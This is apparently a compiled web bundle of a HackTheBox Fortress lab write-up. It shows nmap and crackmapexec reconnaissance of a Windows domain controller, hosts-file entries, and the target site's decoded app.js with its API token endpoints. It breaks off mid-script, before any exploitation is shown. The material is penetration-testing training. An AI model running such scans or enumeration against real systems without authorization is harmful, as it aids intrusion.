"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[299],{78006:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>s,toc:()=>d});var a=t(85893),r=t(11151);const o={},i="AWS",s={id:"HackTheBox/Fortresses/AWS/index",title:"AWS",description:"In 2006, Amazon Web Services (AWS) began offering IT infrastructure services to businesses in the form of web services -- now commonly known as cloud computing.",source:"@site/docs/HackTheBox/Fortresses/AWS/index.md",sourceDirName:"HackTheBox/Fortresses/AWS",slug:"/HackTheBox/Fortresses/AWS/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Fortresses/AWS/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Fortresses/AWS/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Fortresses",permalink:"/Target-Machines-WriteUp/docs/category/HackTheBox-Fortresses"},next:{title:"Akerva",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Fortresses/Akerva/"}},l={},d=[{value:"ENTRY POINT",id:"entry-point",level:2},{value:"First of all",id:"first-of-all",level:2},{value:"Introduction",id:"introduction",level:2},{value:"Early Access",id:"early-access",level:2},{value:"Inspector",id:"inspector",level:2}];function c(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"aws",children:"AWS"}),"\n",(0,a.jsxs)(n.admonition,{title:"ABOUT AWS",type:"note",children:[(0,a.jsx)(n.p,{children:"In 2006, Amazon Web Services (AWS) began offering IT infrastructure services to businesses in the form of web services -- now commonly known as cloud computing."}),(0,a.jsx)(n.p,{children:"Today, Amazon Web Services provides a highly reliable, scalable, low-cost infrastructure platform in the cloud that powers hundreds of thousands of businesses in 190 countries around the world."}),(0,a.jsx)(n.p,{children:"Amazon security is on the cutting edge of many security issues for a wide variety of platforms and technologies including cloud services, Internet of things (IoT), identity and access management, mobile devices, virtualization and custom hardware, all operating at massive scale."}),(0,a.jsx)(n.p,{children:"The AWS Security team shapes and executes the security model for AWS, addressing important considerations for companies thinking about adopting cloud technology. We are also a product team that develops services to provide access control, threat detection, and DDoS protection, allowing companies to scale and innovate in a secure environment. These solutions enable customers to define their own security policies and help developers build cloud-backed applications that are secure."}),(0,a.jsx)(n.p,{children:"As a Security Engineer you will work cross-functionally to assess risk and help deliver countermeasures that protect customers and company data. You will work with engineering teams to create solutions that solve or remediate security problems. You'll advise peers, managers, and senior leaders in order to help influence and drive partner-team compliance in the form of data classification, regulatory obligations, and other security goals. The impact of our work, the complexity of the technical challenges we solve, and the volume of requests we process are a testament to the significant part the team plays in ensuring that customers have the security and reliability they need."}),(0,a.jsx)(n.p,{children:"2006 \u5e74\uff0c\u4e9a\u9a6c\u900a\u7f51\u7edc\u670d\u52a1 (AWS) \u5f00\u59cb\u4ee5\u7f51\u7edc\u670d\u52a1\u7684\u5f62\u5f0f\u5411\u4f01\u4e1a\u63d0\u4f9b IT \u57fa\u7840\u8bbe\u65bd\u670d\u52a1\uff0c\u5982\u4eca\u6211\u4eec\u901a\u5e38\u79f0\u4e4b\u4e3a\u4e91\u8ba1\u7b97\u3002"}),(0,a.jsx)(n.p,{children:"\u5982\u4eca\uff0c\u4e9a\u9a6c\u900a\u7f51\u7edc\u670d\u52a1\u5728\u4e91\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u6269\u5c55\u4e14\u4f4e\u6210\u672c\u7684\u57fa\u7840\u8bbe\u65bd\u5e73\u53f0\uff0c\u4e3a\u5168\u7403 190 \u4e2a\u56fd\u5bb6\u7684\u6570\u5341\u4e07\u5bb6\u4f01\u4e1a\u63d0\u4f9b\u652f\u6301\u3002"}),(0,a.jsx)(n.p,{children:"\u4e9a\u9a6c\u900a\u5b89\u5168\u4f4d\u4e8e\u5404\u79cd\u5e73\u53f0\u548c\u6280\u672f\uff08\u5305\u62ec\u4e91\u670d\u52a1\u3001\u7269\u8054\u7f51 (IoT)\u3001\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u3001\u79fb\u52a8\u8bbe\u5907\u3001\u865a\u62df\u5316\u548c\u5b9a\u5236\u786c\u4ef6\uff09\u7684\u8bb8\u591a\u5b89\u5168\u95ee\u9898\u7684\u6700\u524d\u6cbf\uff0c\u6240\u6709\u8fd9\u4e9b\u90fd\u4ee5\u5927\u89c4\u6a21\u8fd0\u884c\u3002"}),(0,a.jsx)(n.p,{children:"AWS \u5b89\u5168\u56e2\u961f\u5236\u5b9a\u5e76\u6267\u884c AWS \u7684\u5b89\u5168\u6a21\u578b\uff0c\u9488\u5bf9\u8003\u8651\u91c7\u7528\u4e91\u6280\u672f\u7684\u516c\u53f8\u89e3\u51b3\u91cd\u8981\u95ee\u9898\u3002\u6211\u4eec\u4e5f\u662f\u4e00\u4e2a\u4ea7\u54c1\u56e2\u961f\uff0c\u5f00\u53d1\u670d\u52a1\u4ee5\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u3001\u5a01\u80c1\u68c0\u6d4b\u548c DDoS \u4fdd\u62a4\uff0c\u4ece\u800c\u4f7f\u516c\u53f8\u80fd\u591f\u5728\u5b89\u5168\u7684\u73af\u5883\u4e2d\u6269\u5c55\u548c\u521b\u65b0\u3002\u8fd9\u4e9b\u89e3\u51b3\u65b9\u6848\u4f7f\u5ba2\u6237\u80fd\u591f\u5b9a\u4e49\u81ea\u5df1\u7684\u5b89\u5168\u7b56\u7565\uff0c\u5e76\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u6784\u5efa\u5b89\u5168\u7684\u4e91\u7aef\u5e94\u7528\u7a0b\u5e8f\u3002"}),(0,a.jsx)(n.p,{children:"\u4f5c\u4e3a\u4e00\u540d\u5b89\u5168\u5de5\u7a0b\u5e08\uff0c\u60a8\u5c06\u8de8\u804c\u80fd\u5730\u5de5\u4f5c\uff0c\u4ee5\u8bc4\u4f30\u98ce\u9669\u5e76\u5e2e\u52a9\u63d0\u4f9b\u4fdd\u62a4\u5ba2\u6237\u548c\u516c\u53f8\u6570\u636e\u7684\u5bf9\u7b56\u3002\u60a8\u5c06\u4e0e\u5de5\u7a0b\u56e2\u961f\u5408\u4f5c\uff0c\u521b\u5efa\u89e3\u51b3\u65b9\u6848\u6765\u89e3\u51b3\u6216\u8865\u6551\u5b89\u5168\u95ee\u9898\u3002\u60a8\u5c06\u4e3a\u540c\u50da\u3001\u7ecf\u7406\u548c\u9ad8\u7ea7\u9886\u5bfc\u63d0\u4f9b\u5efa\u8bae\uff0c\u4ee5\u5e2e\u52a9\u5f71\u54cd\u548c\u63a8\u52a8\u5408\u4f5c\u4f19\u4f34\u56e2\u961f\u5728\u6570\u636e\u5206\u7c7b\u3001\u76d1\u7ba1\u4e49\u52a1\u548c\u5176\u4ed6\u5b89\u5168\u76ee\u6807\u65b9\u9762\u7684\u5408\u89c4\u6027\u3002\u6211\u4eec\u5de5\u4f5c\u7684\u6210\u679c\u3001\u6211\u4eec\u89e3\u51b3\u7684\u6280\u672f\u6311\u6218\u7684\u590d\u6742\u6027\u4ee5\u53ca\u6211\u4eec\u5904\u7406\u7684\u8bf7\u6c42\u91cf\u8bc1\u660e\u4e86\u56e2\u961f\u5728\u786e\u4fdd\u5ba2\u6237\u62e5\u6709\u6240\u9700\u7684\u5b89\u5168\u6027\u548c\u53ef\u9760\u6027\u65b9\u9762\u53d1\u6325\u7684\u91cd\u8981\u4f5c\u7528\u3002"})]}),"\n",(0,a.jsx)(n.h2,{id:"entry-point",children:"ENTRY POINT"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"10.13.37.15\n"})}),"\n",(0,a.jsx)(n.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.13.37.15"',children:"PORT      STATE SERVICE       VERSION\n53/tcp    open  domain?\n80/tcp    open  http          Apache httpd 2.4.52 ((Win64))\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.52 (Win64)\n|_http-title: Site doesn't have a title (text/html).\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-11 14:05:19Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n2179/tcp  open  vmrdp?\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49682/tcp open  msrpc         Microsoft Windows RPC\n49698/tcp open  msrpc         Microsoft Windows RPC\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.15"',children:"PORT      STATE         SERVICE      VERSION\n53/udp    open          domain       Simple DNS Plus\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    closed        tftp\n123/udp   open          ntp          NTP v3\n| ntp-info:\n|_\n135/udp   open|filtered msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   closed        syslog\n520/udp   closed        route\n631/udp   open|filtered ipp\n1434/udp  closed        ms-sql-m\n1900/udp  closed        upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="crackmapexec smb 10.13.37.15"',children:"SMB         10.13.37.15     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"introduction",children:"Introduction"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"This interesting fortress from AWS features a wide variety of realistic and current techniques, ranging from web exploitation to cloud privilege escalations. This fortress is ideal for those who have a good understanding of web penetration testing and a basic knowledge of cloud services.\nIn conquering this Fortress, participants will learn web application pentesting, forensics & reversing, cloud exploitation, and Active Directory abuse.\n\nAWS \u7684\u8fd9\u4e2a\u6709\u8da3\u7684\u5821\u5792\u5c55\u793a\u4e86\u5404\u79cd\u903c\u771f\u4e14\u5f53\u524d\u7684\u6280\u672f\uff0c\u4ece\u7f51\u7edc\u5229\u7528\u5230\u4e91\u6743\u9650\u63d0\u5347\u3002\u6b64\u5821\u5792\u975e\u5e38\u9002\u5408\u90a3\u4e9b\u5bf9\u7f51\u7edc\u6e17\u900f\u6d4b\u8bd5\u6709\u826f\u597d\u7406\u89e3\u4e14\u5bf9\u4e91\u670d\u52a1\u6709\u57fa\u672c\u4e86\u89e3\u7684\u4eba\u5458\u3002\n\n\u5728\u5f81\u670d\u6b64\u5821\u5792\u65f6\uff0c\u53c2\u4e0e\u8005\u5c06\u5b66\u4e60 Web \u5e94\u7528\u7a0b\u5e8f\u6e17\u900f\u6d4b\u8bd5\u3001\u53d6\u8bc1\u548c\u9006\u5411\u5de5\u7a0b\u3001\u4e91\u5229\u7528\u548c Active Directory \u6ee5\u7528\u3002\n"})}),"\n",(0,a.jsx)(n.h2,{id:"early-access",children:"Early Access"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u901a\u8fc7 ip \u5730\u5740\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="http get 10.13.37.15"',children:'<html><meta http-equiv="refresh" content="0; url=http://jobs.amzcorp.local/" /></html>\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u6dfb\u52a0\u4ee5\u4e0b hosts \u8bb0\u5f55"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/hosts"',children:"10.13.37.15 amzcorp.local\n10.13.37.15 dc01.amzcorp.local\n10.13.37.15 jobs.amzcorp.local\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u518d\u6b21\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(46223).Z+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u53ef\u4ee5\u5c1d\u8bd5\u521b\u5efa\u4e00\u4e2a\u7528\u6237"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(69927).Z+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u767b\u9646\u540e\u5f97\u5230"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(2886).Z+"",width:"2560",height:"1371"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u9875\u9762\u8d44\u6e90\u4e2d\uff0c\u770b\u5230 ",(0,a.jsx)(n.code,{children:"app.js"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(11507).Z+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528 JJEncode \u8fdb\u884c\u89e3\u7801"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\"use strict\";\nconst d = document;\nd.addEventListener(\"DOMContentLoaded\", function(event) {\n\n    const swalWithBootstrapButtons = Swal.mixin({\n        customClass: {\n            confirmButton: 'btn btn-primary me-3',\n            cancelButton: 'btn btn-gray'\n        },\n        buttonsStyling: false\n    });\n\n    var themeSettingsEl = document.getElementById('theme-settings');\n    var themeSettingsExpandEl = document.getElementById('theme-settings-expand');\n\n    if(themeSettingsEl) {\n\n        var themeSettingsCollapse = new bootstrap.Collapse(themeSettingsEl, {\n            show: true,\n            toggle: false\n        });\n\n        if (window.localStorage.getItem('settings_expanded') === 'true') {\n            themeSettingsCollapse.show();\n            themeSettingsExpandEl.classList.remove('show');\n        } else {\n            themeSettingsCollapse.hide();\n            themeSettingsExpandEl.classList.add('show');\n        }\n\n        themeSettingsEl.addEventListener('hidden.bs.collapse', function () {\n            themeSettingsExpandEl.classList.add('show');\n            window.localStorage.setItem('settings_expanded', false);\n        });\n\n        themeSettingsExpandEl.addEventListener('click', function () {\n            themeSettingsExpandEl.classList.remove('show');\n            window.localStorage.setItem('settings_expanded', true);\n            setTimeout(function() {\n                themeSettingsCollapse.show();\n            }, 300);\n        });\n    }\n\n    // options\n    const breakpoints = {\n        sm: 540,\n        md: 720,\n        lg: 960,\n        xl: 1140\n    };\n\n    var sidebar = document.getElementById('sidebarMenu')\n    if(sidebar && d.body.clientWidth < breakpoints.lg) {\n        sidebar.addEventListener('shown.bs.collapse', function () {\n            document.querySelector('body').style.position = 'fixed';\n        });\n        sidebar.addEventListener('hidden.bs.collapse', function () {\n            document.querySelector('body').style.position = 'relative';\n        });\n    }\n\n    var iconNotifications = d.querySelector('.notification-bell');\n    if (iconNotifications) {\n        iconNotifications.addEventListener('shown.bs.dropdown', function () {\n            iconNotifications.classList.remove('unread');\n        });\n    }\n\n    [].slice.call(d.querySelectorAll('[data-background]')).map(function(el) {\n        el.style.background = 'url(' + el.getAttribute('data-background') + ')';\n    });\n\n    [].slice.call(d.querySelectorAll('[data-background-lg]')).map(function(el) {\n        if(document.body.clientWidth> breakpoints.lg) {\n            el.style.background = 'url(' + el.getAttribute('data-background-lg') + ')';\n        }\n    });\n\n    [].slice.call(d.querySelectorAll('[data-background-color]')).map(function(el) {\n        el.style.background = 'url(' + el.getAttribute('data-background-color') + ')';\n    });\n\n    [].slice.call(d.querySelectorAll('[data-color]')).map(function(el) {\n        el.style.color = 'url(' + el.getAttribute('data-color') + ')';\n    });\n\n    //Tooltips\n    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle=\"tooltip\"]'))\n    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {\n    return new bootstrap.Tooltip(tooltipTriggerEl)\n    })\n\n\n    // Popovers\n    var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle=\"popover\"]'))\n    var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {\n      return new bootstrap.Popover(popoverTriggerEl)\n    })\n\n\n    // Datepicker\n    var datepickers = [].slice.call(d.querySelectorAll('[data-datepicker]'))\n    var datepickersList = datepickers.map(function (el) {\n        return new Datepicker(el, {\n            buttonClass: 'btn'\n          });\n    })\n\n    if(d.querySelector('.input-slider-container')) {\n        [].slice.call(d.querySelectorAll('.input-slider-container')).map(function(el) {\n            var slider = el.querySelector(':scope .input-slider');\n            var sliderId = slider.getAttribute('id');\n            var minValue = slider.getAttribute('data-range-value-min');\n            var maxValue = slider.getAttribute('data-range-value-max');\n\n            var sliderValue = el.querySelector(':scope .range-slider-value');\n            var sliderValueId = sliderValue.getAttribute('id');\n            var startValue = sliderValue.getAttribute('data-range-value-low');\n\n            var c = d.getElementById(sliderId),\n                id = d.getElementById(sliderValueId);\n\n            noUiSlider.create(c, {\n                start: [parseInt(startValue)],\n                connect: [true, false],\n                //step: 1000,\n                range: {\n                    'min': [parseInt(minValue)],\n                    'max': [parseInt(maxValue)]\n                }\n            });\n        });\n    }\n\n    if (d.getElementById('input-slider-range')) {\n        var c = d.getElementById(\"input-slider-range\"),\n            low = d.getElementById(\"input-slider-range-value-low\"),\n            e = d.getElementById(\"input-slider-range-value-high\"),\n            f = [d, e];\n\n        noUiSlider.create(c, {\n            start: [parseInt(low.getAttribute('data-range-value-low')), parseInt(e.getAttribute('data-range-value-high'))],\n            connect: !0,\n            tooltips: true,\n            range: {\n                min: parseInt(c.getAttribute('data-range-value-min')),\n                max: parseInt(c.getAttribute('data-range-value-max'))\n            }\n        }), c.noUiSlider.on(\"update\", function (a, b) {\n            f[b].textContent = a[b]\n        });\n    }\n\n    //Chartist\n\n    if(d.querySelector('.ct-chart-sales-value')) {\n        //Chart 5\n          new Chartist.Line('.ct-chart-sales-value', {\n            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],\n            series: [\n                [0, 10, 30, 40, 80, 60, 100]\n            ]\n          }, {\n            low: 0,\n            showArea: true,\n            fullWidth: true,\n            plugins: [\n              Chartist.plugins.tooltip()\n            ],\n            axisX: {\n                // On the x-axis start means top and end means bottom\n                position: 'end',\n                showGrid: true\n            },\n            axisY: {\n                // On the y-axis start means left and end means right\n                showGrid: false,\n                showLabel: false,\n                labelInterpolationFnc: function(value) {\n                    return '$' + (value / 1) + 'k';\n                }\n            }\n        });\n    }\n\n    if(d.querySelector('.ct-chart-ranking')) {\n        var chart = new Chartist.Bar('.ct-chart-ranking', {\n            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],\n            series: [\n              [1, 5, 2, 5, 4, 3],\n              [2, 3, 4, 8, 1, 2],\n            ]\n          }, {\n            low: 0,\n            showArea: true,\n            plugins: [\n              Chartist.plugins.tooltip()\n            ],\n            axisX: {\n                // On the x-axis start means top and end means bottom\n                position: 'end'\n            },\n            axisY: {\n                // On the y-axis start means left and end means right\n                showGrid: false,\n                showLabel: false,\n                offset: 0\n            }\n            });\n\n          chart.on('draw', function(data) {\n            if(data.type === 'line' || data.type === 'area') {\n              data.element.animate({\n                d: {\n                  begin: 2000 * data.index,\n                  dur: 2000,\n                  from: data.path.clone().scale(1, 0).translate(0, data.chartRect.height()).stringify(),\n                  to: data.path.clone().stringify(),\n                  easing: Chartist.Svg.Easing.easeOutQuint\n                }\n              });\n            }\n        });\n    }\n\n    if(d.querySelector('.ct-chart-traffic-share')) {\n        var data = {\n            series: [70, 20, 10]\n          };\n\n          var sum = function(a, b) { return a + b };\n\n          new Chartist.Pie('.ct-chart-traffic-share', data, {\n            labelInterpolationFnc: function(value) {\n              return Math.round(value / data.series.reduce(sum) * 100) + '%';\n            },\n            low: 0,\n            high: 8,\n            donut: true,\n            donutWidth: 20,\n            donutSolid: true,\n            fullWidth: false,\n            showLabel: false,\n            plugins: [\n              Chartist.plugins.tooltip()\n            ],\n        });\n    }\n\n    if (d.getElementById('loadOnClick')) {\n        d.getElementById('loadOnClick').addEventListener('click', function () {\n            var button = this;\n            var loadContent = d.getElementById('extraContent');\n            var allLoaded = d.getElementById('allLoadedText');\n\n            button.classList.add('btn-loading');\n            button.setAttribute('disabled', 'true');\n\n            setTimeout(function () {\n                loadContent.style.display = 'block';\n                button.style.display = 'none';\n                allLoaded.style.display = 'block';\n            }, 1500);\n        });\n    }\n\n    var scroll = new SmoothScroll('a[href*=\"#\"]', {\n        speed: 500,\n        speedAsDuration: true\n    });\n\n    if(d.querySelector('.current-year')){\n        d.querySelector('.current-year').textContent = new Date().getFullYear();\n    }\n\n    // Glide JS\n\n    if (d.querySelector('.glide')) {\n        new Glide('.glide', {\n            type: 'carousel',\n            startAt: 0,\n            perView: 3\n          }).mount();\n    }\n\n    if (d.querySelector('.glide-testimonials')) {\n        new Glide('.glide-testimonials', {\n            type: 'carousel',\n            startAt: 0,\n            perView: 1,\n            autoplay: 2000\n          }).mount();\n    }\n\n    if (d.querySelector('.glide-clients')) {\n        new Glide('.glide-clients', {\n            type: 'carousel',\n            startAt: 0,\n            perView: 5,\n            autoplay: 2000\n          }).mount();\n    }\n\n    if (d.querySelector('.glide-news-widget')) {\n        new Glide('.glide-news-widget', {\n            type: 'carousel',\n            startAt: 0,\n            perView: 1,\n            autoplay: 2000\n          }).mount();\n    }\n\n    if (d.querySelector('.glide-autoplay')) {\n        new Glide('.glide-autoplay', {\n            type: 'carousel',\n            startAt: 0,\n            perView: 3,\n            autoplay: 2000\n          }).mount();\n    }\n\n    // Pricing countup\n    var billingSwitchEl = d.getElementById('billingSwitch');\n    if(billingSwitchEl) {\n        const countUpStandard = new countUp.CountUp('priceStandard', 99, { startVal: 199});\n        const countUpPremium = new countUp.CountUp('pricePremium', 199, { startVal: 299});\n\n        billingSwitchEl.addEventListener('change', function() {\n            if(billingSwitch.checked) {\n                countUpStandard.start();\n                countUpPremium.start();\n            } else {\n                countUpStandard.reset();\n                countUpPremium.reset();\n            }\n        });\n    }\n\n});\n\nSetDatePicker();\n\n$(document).ready(function () {\n    // Delete Item\n    $('.item-row').on('click', '.delete_item', function (event) {\n        event.preventDefault();\n        var btn = $(this);\n        var url = btn.data('href');\n        var param = [];\n        param['url'] = url;\n        param['btn'] = btn;\n\n        $.confirm({\n                title: 'Warning!',\n                content: 'Are you sure you want to delete?',\n                type: 'red',\n                buttons: {\n                    yes: function () {\n                        AjaxRemoveItem(param);\n                    },\n                    no: function () {\n                    }\n                }\n            },\n        );\n    });\n\n    // Edit Item by double click\n    $('.item-row').dblclick(function (event) {\n        event.preventDefault();\n        var item = $(this);\n        var url = item.data('edit');\n        var param = [];\n        param['url'] = url;\n        param['item'] = item;\n        AjaxGetEditRowForm(param);\n    });\n\n    // Save form with click button\n    $('.item-row').on('click', '.save_form', function (event) {\n        event.preventDefault();\n        var btn = $(this);\n        SaveItem(btn);\n    });\n\n    // Save form with ENTER\n    $('.item-row').keyup('.value', function (event) {\n        if (event.keyCode === 13) {\n            event.preventDefault();\n            var btn = $(this);\n            SaveItem(btn);\n        }\n    });\n    $('.item-row').keyup('.name', function (event) {\n        if (event.keyCode === 13) {\n            event.preventDefault();\n            var btn = $(this);\n            SaveItem(btn);\n        }\n    });\n\n    // Cancel edit form\n    $('.item-row').on('click', '.cancel_form', function (event) {\n        event.preventDefault();\n        var btn = $(this);\n        var item = btn.closest('.item-row');\n        var url = item.data('detail');\n        var param = [];\n        param['url'] = url;\n        param['item'] = item;\n        AjaxGetEditRowDetail(param);\n    });\n});\n\n\n// Functions\n\nfunction AjaxGetEditRowDetail(param) {\n    $.ajax({\n        url: param['url'],\n        type: 'GET',\n        success: function (data) {\n            param['item'].html(data);\n        },\n        error: function () {\n            notification.error('Error occurred');\n        }\n    });\n}\n\nfunction AjaxGetEditRowForm(param) {\n    $.ajax({\n        url: param['url'],\n        type: 'GET',\n        success: function (data) {\n            param['item'].html(data);\n            SetDatePicker();\n        },\n        error: function () {\n            notification.error('Error occurred');\n        }\n    });\n}\n\nfunction AjaxPutEditRowForm(param) {\n    $.ajax({\n        url: param['url'],\n        type: 'PUT',\n        data: param['query'],\n        beforeSend: function (xhr) {\n            xhr.setRequestHeader(\"X-CSRFToken\", $.cookie('csrftoken'));\n        },\n        success: function (data) {\n            notification[data.valid](data.message);\n\n            if (data.valid === 'success') {\n                param['item'].html(data.edit_row);\n                SetDatePicker();\n            }\n        },\n        error: function () {\n            toastr.error('Error occurred');\n        }\n    });\n}\n\nfunction AjaxRemoveItem(param) {\n    $.ajax({\n        url: param['url'],\n        type: 'DELETE',\n        data: param['query'],\n        beforeSend: function (xhr) {\n            xhr.setRequestHeader(\"X-CSRFToken\", $.cookie('csrftoken'));\n        },\n        success: function (data) {\n            if (data.valid !== 'success')\n                notification[data.valid](data.message);\n\n            if (data.valid === 'success') {\n                if (data.redirect_url) {\n                    window.location.replace(data.redirect_url);\n                } else {\n                    notification[data.valid](data.message);\n                    var item_row = param['btn'].closest('.item-row');\n                    item_row.hide('slow', function () {\n                        item_row.remove();\n                    });\n                }\n            }\n        },\n        error: function () {\n            toastr.error('Error occurred');\n        }\n    });\n}\n\nfunction SaveItem(btn) {\n    var item = btn.closest('.item-row');\n    var url = item.data('edit');\n    var param = [];\n    param['url'] = url;\n    param['item'] = item;\n    param['query'] = $('.value').serialize() + '&' + $('.name').serialize() + '&' + $('.type').serialize();\n    AjaxPutEditRowForm(param);\n}\n\nfunction SetDatePicker() {\n    var datepickers = [].slice.call(d.querySelectorAll('.datepicker_input'));\n    datepickers.map(function (el) {\n        return new Datepicker(el, {format: 'yyyy-mm-dd'});\n    });\n}\n\nfunction GenerateToken() {\n    var generate_token = document.getElementById('generate_token');\n    var api_token = document.getElementById('api_token');\n    var output = document.getElementById('output');\n    output.innerHTML = '';\n    if (username.value == \"\") {\n        output.innerHTML = \"Username value cannot be empty!\";\n        setTimeout(() => {\n            document.getElementById('closeAlert');\n        }, 2000);\n        return;\n    }\n    xhr.open('POST', '/api/v4/tokens/generate_token');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            api_token.append(this.response['token']);\n        }\n    };\n    data = {\n        \"generate_token\": generate_token\n    }\n    xhr.send(data);\n}\n\nfunction GetToken() {\n    var uuid = document.getElementById('uuid');\n    var username = document.getElementById('username');\n    var api_token = document.getElementById('api_token');\n    var output = document.getElementById('output');\n    output.innerHTML = '';\n    if (username.value == \"\") {\n        output.innerHTML = \"Username value cannot be empty!\";\n        setTimeout(() => {\n            document.getElementById('closeAlert');\n        }, 2000);\n        return;\n    }\n    xhr.open('POST', '/api/v4/tokens/get');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            api_token.append(this.response['token']);\n        }\n    };\n    data = btoa('{\"get_token\":\"True\",\"uuid\":' + uuid ',\"username\":' + username + '}');\n    xhr.send({\n        \"data\": data\n    });\n}\n\nfunction GetLogData() {\n    var log_table = document.getElementById('log_table');\n    const xhr = new XMLHttpRequest();\n\n    xhr.open('GET', '/api/v4/logs/get_logs');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            log_table.append(this.response['log']);\n        }\n    };\n    xhr.send();\n}function GenerateToken() {\n    var generate_token = document.getElementById('generate_token');\n    var api_token = document.getElementById('api_token');\n    var output = document.getElementById('output');\n    output.innerHTML = '';\n    if (username.value == \"\") {\n        output.innerHTML = \"Username value cannot be empty!\";\n        setTimeout(() => {\n            document.getElementById('closeAlert');\n        }, 2000);\n        return;\n    }\n    xhr.open('POST', '/api/v4/tokens/generate');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            api_token.append(this.response['token']);\n        }\n    };\n    data = {\n        \"generate_token\": generate_token\n    }\n    xhr.send(data);\n}\n\nfunction GetToken() {\n    var uuid = document.getElementById('uuid');\n    var username = document.getElementById('username');\n    var api_token = document.getElementById('api_token');\n    var output = 